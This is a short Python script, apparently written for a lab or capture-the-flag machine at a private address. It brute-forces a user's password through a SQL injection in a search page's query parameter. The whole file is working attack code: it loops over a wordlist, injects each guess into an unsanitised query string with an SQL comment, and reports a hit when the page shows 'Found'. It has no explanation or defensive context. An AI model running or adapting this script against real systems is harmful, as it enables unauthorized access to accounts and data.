import requests
import sys
import time
import os
def bruteSession():
	url = 'http://10.0.2.10/inc/search.php?testcookie'
	s = requests.Session()
	print("[*] URL SESSION - "+str(s.get(url)))
	return s
def bruteTest(session,username):
	wordlist = open(sys.argv[2],"r")
	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
	}
	for password in wordlist:
		password = password.strip()
		print("[*] Testing - "+password)
		url = "http://10.0.2.10/inc/search.php?query="+username+"' and password='"+password+"' -- ;"
		r = session.get(url,headers=headers)
		result = str(r.text)
		if '<h2>Found' in result:
			print ('[*] Found - '+password+' for user '+sys.argv[1])
			break
		time.sleep(0.25)
	wordlist.close()
def main():
	if len(sys.argv) == 3:
		print("[*] Username = "+sys.argv[1])
		s=bruteSession()
		bruteTest(s,sys.argv[1])
	else:
		print("usage: python3 brute.py username wordlist.txt")
if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print('[*] Interrupted')
		try:
			sys.exit(1)
		except SystemExit:
			os._exit(1)
